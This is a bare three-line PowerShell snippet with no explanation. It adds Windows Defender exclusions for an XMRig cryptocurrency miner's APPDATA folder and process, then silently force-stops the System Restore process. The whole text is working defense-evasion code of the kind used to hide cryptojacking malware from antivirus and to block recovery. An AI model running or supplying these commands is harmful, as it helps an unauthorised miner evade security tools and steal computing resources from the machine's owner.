Add-MpPreference -ExclusionPath "$env:APPDATA\xmrig"
Add-MpPreference -ExclusionProcess "xmrig.exe"
Stop-Process -Name "rstrui" -Force -ErrorAction SilentlyContinue
